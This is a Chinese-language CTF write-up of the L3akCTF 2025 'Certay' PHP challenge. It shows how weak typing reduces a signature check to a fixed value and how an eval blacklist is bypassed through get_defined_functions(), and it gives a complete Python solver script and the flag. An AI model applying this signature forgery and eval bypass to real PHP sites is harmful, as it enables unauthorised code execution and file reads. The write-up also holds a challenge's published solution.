# L3akCTF 2025 Certay Writeup

## 题目简述

题目是一个 PHP 7.4 记事网站。登录用户可以保存任意 note，但只有通过 `dashboard.php` 的签名校验后，服务器才会逐条 `eval` note。应用同时用函数名黑名单阻止直接调用文件读取和命令执行函数。

决定性障碍是组合 PHP 弱类型造成的签名退化与间接函数调用绕过黑名单，本文按 Web 归档。

## 解题过程

### 让签名退化为固定值

相关代码为：

```php
define('yek', $_SESSION['yek']);

if (!isset($_SESSION['yek'])) {
    $_SESSION['yek'] = openssl_random_pseudo_bytes(16);
}

function safe_sign($data) {
    return openssl_encrypt($data, 'aes-256-cbc', KEY, 0, iv);
}

function custom_sign($data, $key, $vi) {
    return openssl_encrypt($data, 'aes-256-cbc', $key, 0, $vi);
}

if (custom_sign($_GET['msg'], $yek, safe_sign($_GET['key'])) === $_GET['hash']) {
    // eval notes
}
```

这里有三处相互叠加的问题：

1. 代码定义的是常量 `yek`，校验时使用的却是从未赋值的变量 `$yek`；
2. `safe_sign` 使用未定义常量 `iv`；
3. 让参数以 `key[]=` 形式出现时，`$_GET['key']` 变成数组。PHP 7.4 会让期望字符串的 `openssl_encrypt` 失败并返回假值。

于是外层加密最终使用空 key 和空 IV。OpenSSL 会把它们按 AES-256-CBC 所需长度补零，签名不再依赖容器构建时随机生成的 `KEY`。选择消息 `cea` 时，固定结果为：

```text
mq/1NjPIVqO8vD4dQU+4mg==
```

请求参数应为：

```text
msg=cea
hash=mq/1NjPIVqO8vD4dQU+4mg==
key[]=
```

这个利用依赖题目指定的 PHP 7.4 弱类型行为；在 PHP 8 中，数组传入字符串参数通常会直接抛出 `TypeError`。

### 绕过 eval 黑名单

程序会拒绝形如 `readfile(...)`、`file_get_contents(...)` 的直接调用，却允许 `get_defined_functions()`。该函数返回当前运行环境中的内部函数名数组，因此可以用数字下标取出目标函数，再立即调用：

```php
get_defined_functions()["internal"][789]("/tmp/flag.txt");
```

在题目固定的 PHP 7.4 镜像及扩展组合中，第 789 项是能够把文件内容写入响应的内部函数。数字索引依赖具体 PHP 构建，换环境时应先枚举确认，不能把 789 当作跨版本常量。

黑名单正则只寻找危险函数名后跟左括号。上面的 note 文本中没有出现实际文件读取函数名，因此能够进入 `eval`；执行时才由数组值完成间接调用。

### 完整请求流程

先注册并登录新账号，再保存 payload，最后带退化后的签名访问 dashboard：

```python
import re
import requests

base = "http://target"
s = requests.Session()

account = {"username": "solver123", "password": "solver123"}
s.post(base + "/register.php", data=account)
s.post(base + "/login.php", data=account)

s.post(base + "/post_note.php", data={
    "note": 'get_defined_functions()["internal"][789]("/tmp/flag.txt");'
})

r = s.get(base + "/dashboard.php", params=[
    ("msg", "cea"),
    ("hash", "mq/1NjPIVqO8vD4dQU+4mg=="),
    ("key[]", ""),
])
print(re.search(r"L3AK\{.*?\}", r.text).group(0))
```

响应中得到：

```text
L3AK{N0t_4_5ecret_4nYm0r3333!!5215kgfr5s85z9}
```

## 方法总结

本题的签名逻辑并不是“密钥泄露”，而是变量名、未定义常量和数组参数共同让两层 OpenSSL 调用退化为空 key、空 IV 的确定性计算。分析 PHP 密码包装时，除了算法本身，还应逐项确认实参类型、返回值以及所用变量是否真的被赋值。

函数名黑名单无法约束 `eval` 的完整语义。攻击者可以通过函数表、回调、反射等方式在运行时才解析目标 callable。本题用固定镜像中的内部函数索引完成间接读取，也说明按函数名扫描用户代码不是可靠的安全边界。
